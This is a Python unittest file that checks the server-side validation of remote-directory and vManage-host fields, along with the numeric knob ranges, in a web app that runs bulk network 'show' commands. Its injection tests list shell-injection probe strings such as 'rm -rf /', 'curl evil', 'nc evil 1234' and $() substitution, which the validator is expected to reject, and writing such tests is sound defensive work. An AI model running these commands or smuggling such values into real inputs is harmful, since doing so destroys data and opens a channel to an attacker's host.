"""Tests for the server-side form validation added in Wave 1.

Covers the ``remote_dir`` / ``vmanage_host`` allow-list regexes (A2, including
shell-injection probe strings) and the range checks for the wired-through
bulk-show.py knobs (C3).
"""

from __future__ import annotations

import unittest

from webapp import runner


def _form(**overrides) -> runner.RunForm:
    defaults = dict(
        vmanage_host="vmanage.test",
        user="admin",
        password="pw",
        remote_dir="/home/admin",
        hosts_text="10.0.0.1,admin,p1\n",
        commands_text="show version\n",
    )
    defaults.update(overrides)
    return runner.RunForm(**defaults)


class RemoteDirValidationTests(unittest.TestCase):
    def test_accepts_absolute_and_home_relative(self) -> None:
        runner.validate_form(_form(remote_dir="/home/admin"))
        runner.validate_form(_form(remote_dir="~/sdwan-bulk-show"))
        runner.validate_form(_form(remote_dir="~"))
        runner.validate_form(_form(remote_dir="/opt/run.dir-1/sub"))

    def test_rejects_injection_strings(self) -> None:
        for bad in (
            "/home/admin; rm -rf /",
            "/home/admin && curl evil",
            "/home/admin | nc evil 1234",
            "/home/admin`whoami`",
            "/home/admin$(id)",
            "/home/admin with space",
            "relative/path",  # must start with / or ~
            "/home/admin\nshow",
        ):
            with self.subTest(bad=bad):
                with self.assertRaises(runner.RunInputError):
                    runner.validate_form(_form(remote_dir=bad))


class VManageHostValidationTests(unittest.TestCase):
    def test_accepts_ipv4_and_hostnames(self) -> None:
        runner.validate_form(_form(vmanage_host="192.0.2.10"))
        runner.validate_form(_form(vmanage_host="vmanage-01.example.com"))
        runner.validate_form(_form(vmanage_host="vmanage"))

    def test_rejects_injection_strings(self) -> None:
        for bad in (
            "10.0.0.1; rm -rf /",
            "10.0.0.1 && id",
            "host name",
            "host|pipe",
            "$(id)",
            "10.0.0.1\nshow version",
            "-leading-hyphen",
        ):
            with self.subTest(bad=bad):
                with self.assertRaises(runner.RunInputError):
                    runner.validate_form(_form(vmanage_host=bad))


class KnobRangeValidationTests(unittest.TestCase):
    def test_retries_range(self) -> None:
        runner.validate_form(_form(retries=0))
        runner.validate_form(_form(retries=runner.MAX_RETRIES))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(retries=-1))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(retries=runner.MAX_RETRIES + 1))

    def test_max_workers_range(self) -> None:
        runner.validate_form(_form(max_workers=None))
        runner.validate_form(_form(max_workers=1))
        runner.validate_form(_form(max_workers=runner.MAX_WORKERS_CAP))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(max_workers=0))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(max_workers=runner.MAX_WORKERS_CAP + 1))

    def test_controller_port_range(self) -> None:
        runner.validate_form(_form(controller_port=22))
        runner.validate_form(_form(controller_port=65535))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(controller_port=0))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(controller_port=70000))

    def test_output_formats(self) -> None:
        runner.validate_form(_form(output_formats=["text"]))
        runner.validate_form(_form(output_formats=["text", "json", "csv"]))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(output_formats=[]))
        with self.assertRaises(runner.RunInputError):
            runner.validate_form(_form(output_formats=["text", "xml"]))


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
